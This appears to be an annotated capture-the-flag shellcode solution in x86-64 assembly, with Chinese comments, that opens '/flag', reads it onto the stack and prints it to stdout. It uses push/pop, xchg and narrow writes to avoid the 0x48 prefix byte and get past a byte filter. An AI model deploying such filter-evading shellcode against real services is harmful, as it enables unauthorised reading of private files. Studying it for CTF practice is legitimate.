.global _start
_start:
.intel_syntax noprefix

    /* ==================================================
       1. OPEN: open("/flag", O_RDONLY) -> Syscall 2
       ================================================== */
    xor esi, esi                    /* rsi = 0 (O_RDONLY 标志)。机器码: 31 f6 */
    push rsi                        /* 压入 8 字节 0，作为字符串的 Null Terminator */
    push rsp
    pop rdi                         /* rdi 现在指向栈顶的连续 0。规避了 mov rdi, rsp */

    /* 拼接 "/flag"。注意我们只用 32 位和 8 位内存写入，避开 0x48 */
    /* "/fla" = 0x616c662f (小端序) */
    mov dword ptr [rdi], 0x616c662f /* 机器码: c7 07 2f 66 6c 61 */
    /* "g" = 0x67 */
    mov byte ptr [rdi+4], 0x67      /* 机器码: c6 47 04 67 */

    push 2
    pop rax                         /* rax = 2 (open 的系统调用号) */
    syscall                         /* 执行 open，返回的文件描述符 fd 将存入 rax (通常是 3) */

    /* ==================================================
       2. READ: read(fd, buffer, size) -> Syscall 0
       ================================================== */
    /* 用 xchg 交换寄存器。xchg eax, edi 只需要 1 个字节 (0x97)！
       不仅把 fd (rax) 给了 rdi，还顺便清空了 eax 给后面的 read 做准备。*/
    xchg eax, edi                   /* rdi = fd (通常为 3) */

    push rsp
    pop rsi                         /* rsi = rsp (把当前栈顶作为接收文件内容的 buffer) */

    mov dl, 100                     /* rdx = 100 (读取 100 字节)。用 8 位寄存器 dl 避开前缀 */
    xor eax, eax                    /* rax = 0 (read 的系统调用号) */
    syscall                         /* 执行 read。成功后，rax 会返回实际读取的字节数*/

    /* ==================================================
       3. WRITE: write(stdout, buffer, size) -> Syscall 1
       ================================================== */
    /* 我们需要把刚刚 read 返回的字节数 (rax) 传给 rdx 作为 write 的 size */
    xchg eax, edx                   /* rdx = 实际读取的字节数。又是只有 1 字节 (0x92) */

    push 1
    pop rdi                         /* rdi = 1 (标准输出 stdout) */
    /* rsi 此时仍然指向 buffer */

    push 1
    pop rax                         /* rax = 1 (write 的系统调用号) */
    syscall

